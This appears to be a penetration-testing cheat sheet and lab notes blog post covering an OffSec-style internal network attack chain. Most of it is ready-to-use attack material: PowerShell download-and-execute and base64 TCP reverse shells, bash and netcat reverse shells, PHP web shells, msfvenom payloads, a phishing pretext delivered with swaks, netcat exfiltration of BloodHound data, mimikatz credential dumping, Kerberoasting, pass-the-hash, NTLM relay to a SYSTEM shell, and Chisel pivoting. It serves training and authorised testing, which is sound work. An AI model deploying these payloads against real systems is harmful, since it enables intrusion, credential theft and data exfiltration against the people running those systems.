---
title: "OffSec Field Notes \u2014 Shells and Tradecraft Snippets"
slug: operator-shells
author: m4xx3d0ut
summary: 'This cheat sheet now captures the extra context from the raw notes: when
  to use each command, expected output, and follow-up actions.'
publishedAt: '2023-08-31'
updatedAt: '2024-03-20'
readingMinutes: 20
tags:
- offsec
---
# OffSec Field Notes — Shells and Tradecraft Snippets

## TLDR;

This cheat sheet now captures the extra context from the raw notes: when to use each command, expected output, and follow-up actions.

### Recon & Enumeration

```
# Full TCP sweep with service scripts
sudo nmap -sC -sV -oA scans/$TARGET $TARGET_IP

# Directory brute force with file extension permutations
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config,php,bak -o scans/$TARGET-gobuster.txt

# Stack fingerprinting
whatweb http://$TARGET_IP
```

Log discovered hosts in `loot/hosts.csv` with service notes.

### Exploit Preparation

```
# Search Exploit-DB locally
searchsploit $SERVICE_NAME

# Convert SSH key for cracking
ssh2john ~/.ssh/id_rsa > loot/ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo loot/ssh.hash
```

Document cracked credentials with timestamps and rotation status.

### Local Enumeration

```
# Linux quick hits
linpeas.sh | tee loot/linpeas-$(hostname).log
hostname
id
ip -a

# Windows quick hits
winPEASx64.exe > loot/winpeas-$(hostname).log
systeminfo
whoami /all
```

Flag potential privesc leads (SUID, service paths, interesting credentials) in your tracker.

### SMB & WebDAV

```
crackmapexec smb $TARGET_IP -u john -p "$PASS" --shares
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
```

Use WebDAV to stage payloads for `.library-ms` lures or WebShells; record URLs.

### Payload Delivery Snippets

```
# Windows library-ms template (trimmed)
<libraryDescription>...
    <url>http://$KALI_IP</url>
</libraryDescription>

# PowerShell reverse shell launcher
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI_IP:8000/powercat.ps1'); powercat -c $KALI_IP -p $KALI_PORT -e powershell"
```

Annotate payload hashes and detections encountered.

### Operator Quality of Life

```bash
nc -nvlp 4444
Start-Process -NoNewWindow .\metrtcp.exe
```

Pair listeners with session logging (`script`, `tmux capture-pane`) so you can recover commands later.

### AD Enumeration & Exfil

```
# BloodHound collection
Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -Domain corp.local -ZipFile .\loot\BH.zip

# Transfer data home
nc -lp 4445 > bloodhound.zip
.\nc.exe -w 3 192.168.45.163 4445 < BloodHound.zip
```

Record collection times, file hashes, and transfer commands to maintain chain-of-custody.

Keep this sheet close, annotate it as you learn, and fold discoveries back into your playbooks.

## Working Notes... In Graphic Detail...

### Pentest Methodology

Port scanning
```bash
sudo nmap -sC -sV -oN $TARGET/nmap $TARGET_IP
```

Directory enumeration
```
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

Web app identification
```
whatweb http://$TARGET_IPhttps://github.com/picocms/Pico
```

WordPress scan
```
wpscan --url http://$TARGET_IP --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

Search for public exploits
```
searchsploit $SVC_OR_PLGIN_NAME
```

Crack SSH key passphrases
```
ssh2john $KEY_FILE > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

Local enumeration
```
# Linux
linpeas.sh
hostname
id
ip -a
# Windows
winPEASx64.exe
    /Basic System Information
    /AV Information
    /Network Ifaces and known hosts
systeminfo
ipconfig
hostname
whoami
```

SMB enumeration
```
crackmapexec smb $TARGET_IP -u john -p "$PASSWD" --shares
```

Anon WebDAV share
```
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
```

Windows Library file `*.library-ms`
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://$KALI_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Windows shortcut to download PowerCat reverse shell payload
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI_IP:8000/powercat.ps1'); powercat -c $KALI_IP -p $KALI_PORT -e powershell"
```

Netcat listener
```bash
nc -nvlp 4444
```

**Swaks email phishing**
Create `body.txt` with pretext, example:
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
- This may convince our target to open the attachment.
    - *In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.*.

Build command
```bash
sudo swaks -t $VALID_RECIPIENT_0 -t $VALID_RECIPIENT_1 --from $VALID_EMAIL_ADDRESS --attach @config.Library-ms --server $MAIL_SRV_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

**AD Enumeration**
Upload SharpHound collector.
```
iwr -uri http://$KALI_IP:8000/SharpHound.ps1 -Outfile SharpHound.ps1
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Transfer to Kali
```
# Kali
nc -lp 4445 > bloodhound.zip
# Target
.\nc.exe -w 3 192.168.45.163 4445 < BloodHound.zip
```

Start `neo4j`, `bloodhound`, and "upload data"
```bash
sudo neo4j start
bloodhound &
```

Basic enumeration raw queries
```
# Display domain connected computers
MATCH (m:Computer) RETURN m
# Display domain users
MATCH (m:User) RETURN m
# Display active user sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

**Detact PowerShell Process**
Will not die if original shell fails
```
Start-Process -NoNewWindow .\metrtcp.exe
```

**Meterpreter Autoroute & SOCKS5 Proxy**
```
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
```

**Meterpreter Migrate**
```
execute -H -f notepad.exe
(proc created 1500)
migrate 1500
```

With the SOCKS5 proxy active we can configure proxychains to access the internal network.
```
socks5          127.0.0.1 1080
```

**SMB Credential Spray Internal Network via Proxy**
Example:
```bash
sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```

**Nmap Internal Network via Proxy**
Example:
```bash
sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
```

**Chisel Proxy Connections**
[Chisel](https://github.com/jpillora/chisel)

```bash
┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ gunzip chisel_1.9.0_linux_amd64.gz

┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ mv chisel_1.9.0_linux_amd64 chisel

┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ file chisel
chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=jGqNcOxUVIlhmjt2owNC/py0c32hpuO79Sykl3kHD/FZVs4pG8bg5V4LUlZY9Y/lFf4TEBORjLxICoiMGrZ, stripped

┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ chmod a+x chisel

┌──(operator㉿labhost)-[~/OffSec/beyond]dcom ports
└─$ ./chisel server --port 8080 --reverse
2023/12/30 13:53:39 server: Reverse tunnelling enabled
2023/12/30 13:53:39 server: Fingerprint vUZ4fX/iMvelnGlgbmMUxddmoyO2m1/D7/9Hy8gKbQ4=
2023/12/30 13:53:39 server: Listening on http://0.0.0.0:8080
```

From our target shell we can run Chisel in client mode to connect back to Kali on port 8080 by creating a reverse port forward with syntax `R:localport:remotehost:remoteport`.
```
meterpreter > shell
Process 7884 created.
Channel 55 created.
Microsoft Windows [Version 10.0.22000.978]
(c) Microsoft Corporation. All rights reserved.

C:\Users\marcus>chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
2023/12/30 14:10:54 client: Connecting to ws://192.168.45.163:8080
2023/12/30 14:10:55 client: Connected (Latency 78.2679ms)
```
- Bind INTERNALSRV1 port 80 to Kali port 80.
    - *NOTE: kill wsgidav server first*.
```bash
┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ ./chisel server --port 8080 --reverse
2023/12/30 14:03:01 server: Reverse tunnelling enabled
2023/12/30 14:03:01 server: Fingerprint D8xrjq850tcudK3gJ2HmABSmOEjGVwsL1TpTmahCJWo=
2023/12/30 14:03:01 server: Listening on http://0.0.0.0:8080
2023/12/30 14:10:55 server: session#36: tun: proxy#R:81=>172.16.87.241:80: Listening
```
- With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.

**Mimikatz Cached Creds**
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Lateral Movement via Impacket-psexec**
Example:
```
proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
```

**Kerberoasting with Impacket**
We can Kerberoasting from Kali with `impacket-GetUserSPNs` over our SOCKS5 proxy.  To obtain the TGS-REP hash of `daniela` we need to provide the creds of a domain user, so we will use `john`.
Example:
```
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john

Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 01:17:20.062328  2022-10-05 00:59:48.376728



[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289cbf2$14d33d1eaa975da1b090c3de10c70319f6fc59c3ab31a35e956601901575a2d697baaef3d2147bfd4dae43aab19ed82300ed47ccf9925cd246711ebedbc9635fa876b85131b4b3fa11386393a59f4a8c58c69cfbe947959953fafb08a73032b382cc911daa1860e411099e12c42d49568e0410115bf6d841a7b0b8876dd4449ee94e87f48112504b419c3f6ba64edba7cc2c2e16147a8996524ea98f4a56cd7c19a017cf5f212c9292a8d12ca314e996e13da71800715b6a922379d50deceac9ca0c101f2282c3168e9b10adadccfa63740de5c2d819aba279919272163d4041246d7eaf4cfed29379b3b3e557b12a0427819280fa71a4c2e02eb8c4435be17554b2ff6014919ca6da594fed553be047470379133ab689886a31b8d9090ef1a8c221e2a99b912a6b331ab86bb9f398655f2880a096fb40fd7f498bea77acda21b83bb762c3ebd2ee40acf25e9a3aa8d770e0997f1635cd0e3c02dbe6b1956defcb0dca884248190a5e67c077c2d8c042c94fcc9c5122ccf9996693ddaec616828d83bf2dcc8f923f368fe542f04c4dfd03d8bbf31c96e65d971ea6f991a2def70bd04e2313225bcc3aa5380c40525d055ed28f817208d0bfc690916ef509f0bc147045132e7bb08f963e624ee48b0cf5c0160dddb9c496e23ac8b5a3f10c65a91f1225ada552d40af5503966e49e9f15993b8ac98b6d8a3c532c9b8909ea7f8338930f312cf295b0012bd92da3ee44404234f53123f25070b9531d1fbdf50bf04724748b07326b999117b6f7c93dd89b474ee63cbcf40fd2843739e49e16d25df66d6c6daf727479378667178c89de6d11be01e5a0d91dfa4b44ae77d8764be7e44058f24a85d3ab9046ce87933e2d3a7aba23e3c6a850e5390f10f3a343a5bdff3754be06719d5a8e83218b6330513db0f9d3d38c04b9007290c9bf00d8b80be650fa407205734978b0cbe11dadd3dce07c258f63db8f7154c181b449d6c10312e6c83d34ff46ecc500bbb2c298232963abb2f889e4423a702486d91d5b1edabc4603029f69d9afea5572c83edf911a044e867bc098368d49be3164346d3906197e46c761b511038e10ede277eb90d6be09569c7c45c344f011e1142d3b4b5ee05678f487e4c01295cfe7b1bc9022ca0af9ecee463d75370d190156e9915b286e3f811ac8b27ef6ac69c166fb02947c5303e760e840849d7259980eabc8d33df0d27b4555ca57bfb8b1dca91bf957a1d8c9b8facac0a23ef05355f54d27f35255e551ac8aa76e37b9be40aa1b4df5ccb5d5b71e12025b844782c36a44dd71d3a174373c9a776e4f0cfdcbf36445edd105291212101cd71de93b8d56882727
```

Store the hash to `daniela.hash` an crack with Hashcat.
```bash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```

**Impacket SMB Relay Attack**
Can be utilized in any case where an auth request can be forced:
- Web app backup plugin path.
- SMB requests.

First we need to setup the `impacket-ntlmrelayx` before we modify the backup directory path of the WP plugin.  Use `--no-http-server` and `-smb2support` to disable the HTTP server and enable SMB2 support.  We need to specify the external address of MAILSRV1 as the target of our relay attack, so we won't have to proxy via proxychains.  We'll also base64-encode the PowerShell reverse shell [oneliner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) to connect back to our attacking system on port 9999 and provide it as a command to `-c`.
```
# PowerShell One-liner

┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.163",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
└─PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==


# Bse64 Encode

┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ echo -n '$client = New-Object System.Net.Sockets.TCPClient('192.168.45.163',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | base64
JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgxOTIuMTY4
LjQ1LjE2Myw5OTk5KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRl
cyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5
dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVt
LlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0g
KGlleCAiLiB7ICRkYXRhIH0gMj4mMSIgfCBPdXQtU3RyaW5nICk7ICRzZW5kYmFjazIgPSAkc2Vu
ZGJhY2sgKyBQUyAgKyAocHdkKS5QYXRoICsg

# Setup NTLM Relay

┌──(operator㉿labhost)-[~/OffSec/beyond]
└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC <....
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Next we need a Netcat listener to catch the reverse shell.
```bash
┌──(operator㉿labhost)-[~]
└─$ nc -lnvp 9999
listening on [any] 9999 ...
```

With everything setup we can modify the Backup directory path.

Set the path to the URI reference `//192.168.45.163/test` where the IP is our Kali machine and `/test` is a nonexistent path.
![156b67d1d13a6a7b87d4587904efcffa.png](../_resources/156b67d1d13a6a7b87d4587904efcffa.png)
- Once entered scroll down and click Save.
    - This causes the WP plugin to auth to our `impacket-ntlmrelayx` in the context of the user running WP.

```
[*] Authenticating against smb://192.168.201.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] SMBD-Thread-33 (process_request_thread): Connection from 192.168.201.242 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.201.242
[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
[*] Stopping service RemoteRegistry
```
- This confirms our 2 assumptions.
    - INTERNALSRV1/ADMINISTRATOR was used to perform auth.
    - Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.

The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!
```bash
┌──(operator㉿labhost)-[~]
└─$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [192.168.45.163] from (UNKNOWN) [192.168.201.242] 53368

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
MAILSRV1
PS C:\Windows\system32>
```
- We have obtained code execution as NT AUTHORITY\SYSTEM by authenticating as local admin on MAILSRV1.
    - Achieved by relaying an auth attempt from WP plugin on INTERNALSRV1.


### Shells

#### Resources

https://github.com/0dayCTF/reverse-shell-generator

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://github.com/swisskyrepo/PayloadsAllTheThings

https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da

https://nmap.org/ncat/guide/index.html

---

#### Enumeration

##### Web Servers

Always start with Nmap...
```bash
sudo nmap -v -O -sV -p 1-65535 192.168.X.X
```
- Check out service versions with `searchsploit`
	- Inspect result with `searchsploit -x XXXX`
	- Clone to pwd with `searchsploit -m XXXX`
- Search scripts with `nmap --script-help "*" | less`
 - Follow up with `--script` scans on relevant services.
And then Gobuster *(Especially helpful for IIS servers)*.
```bash
┌──(operator㉿labhost)-[~/OffSec/]
└─$ gobuster dir -x .pdf,.txt,.php -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
```
- Add a `-x` to seach for common file extensions.
	- Example: `-x .pdf,.txt,.php`

---

#### Encoding

##### Base64

###### Bash
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ echo -n "test@supermagicorg.com" | base64
dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==

┌──(operator㉿labhost)-[~/OffSec]
└─$ echo -n "test" | base64
dGVzdA==

┌──(operator㉿labhost)-[~/OffSec/]
└─$ echo "VXNlcm5hbWU6" | base64 -d -                  
Username:                                                                             
┌──(operator㉿labhost)-[~/OffSec/]
└─$ echo "UGFzc3dvcmQ6" | base64 -d -
Password:   
```

###### NodeJS
```bash
┌──(operator㉿labhost)-[~/OffSec/]
└─$ nodejs
Welcome to Node.js v18.13.0.
Type ".help" for more information.
> btoa('test@supermagicorg.com')
'dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ=='
> btoa('test')
'dGVzdA=='
> atob('VXNlcm5hbWU6')
'Username:'
> atob('UGFzc3dvcmQ6')
'Password:' 
```

---

#### Email Server CLI Interactions

##### Telnet

###### Send Mail
- `telnet 192.168.206.199 587`
 - SMTPD submission port connection.
- `EHLO smtp.supermagicorg.com`
	- Initiate interaction, server replies;
		- `250-ADMIN`
		- `250-SIZE 20480000`
		- `250-AUTH LOGIN`
		- `250 HELP`
- `AUTH LOGIN`
	- Initiate login, server replies;
		- `334 VXNlcm5hbWU6`
		- Base64: `Username:`
- `dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==`
	- Send base64 enc email address, server replies;
		- `334 UGFzc3dvcmQ6`
		- Base64: `Password:`
- `dGVzdA==`
	- Send base64 enc password, server replies;
		- `235 authenticated.`
- `MAIL FROM: test@supermagicorg.com`
	- Set sender, server replies;
		- `250 OK`
- `RCPT TO: dave.wizard@supermagicorg.com`
	- Set recipient, server replies;
		- `250 OK`
- `DATA`
	- Message data, server replies;
		- `354 OK, send.`
- `Subject: test`
 - Set subject.
	- (Press Enter Again)
- `Test test.`
 - Message body.
- `.`
 - Send message.
- `QUIT`
	- Close connection, sever replies;
		- `221 goodbye`

*See Appendix A.1 for Bash script example*

###### Read Mail
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ telnet 192.168.206.199 110
Trying 192.168.206.199...
Connected to 192.168.206.199.
Escape character is '^]'.
+OK POP3
user test@supermagicorg.com
+OK Send your password
pass test
+OK Mailbox locked and ready
list
+OK 1 messages (1725 octets)
1 1725
.
retr 1
```

---

#### Web Shells

##### PHP

###### One-liners
```
<?php system($_GET['cmd']); ?>

<?php echo passthru($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php passthru($_REQUEST['cmd']); ?>
```


---

#### General Purpose Reverse Shell Listeners

##### Linux

###### Netcat
```bash
nc -nvlp 4444
```

##### Metasploit Console Reverse TCP Listener One-Liner
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;"
```

---

#### Useful Reverse Shell Payloads

##### MsfVenom

List payloads.
```
msfvenom -l payloads --platform windows --arch x64
`
```

List payload options.
```
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_https --list-options
```

Win x64 single stage reverse TCP.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
```

Win x64 staged reverse TCP.
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe
```

PHP reverse shell.
```
msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
`
```

Win x64 reverse HTTPS.
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
`
```
*HTTPS Basic Options*
```
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process
                                       , none)
EXTENSIONS                   no        Comma-separate list of extensions to load
EXTINIT                      no        Initialization strings for extensions
LHOST                        yes       The local listener hostname
LPORT       8443             yes       The local listener port
LURI                         no        The HTTP Path
```

###### multi/handler

From msfconsole.
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > show options
```

From local shell.
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST 192.168.45.240;set LPORT 443;run;"
```

###### Migrate

Create hidden notepad process and migrate into it.
```
meterpreter > execute -H -f notepad
Process 5256 created.
meterpreter > migrate 5256
[*] Migrating from 2500 to 5256...
[*] Migration completed successfully.
```

##### Linux

###### URL Encode with CURL
```bash
curl \
    --data-urlencode "paramName=value" \
    --data-urlencode "secondParam=value" \
    http://example.com
```

###### Bash
```
'/usr/bin/bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1"'
```

###### Netcat
```
'nc 192.168.45.223 4444 -e /usr/bin/bash'
```

##### Win

###### Powershell base64 encoded one-liner
```
--- PS On Attacker ---

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.223",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

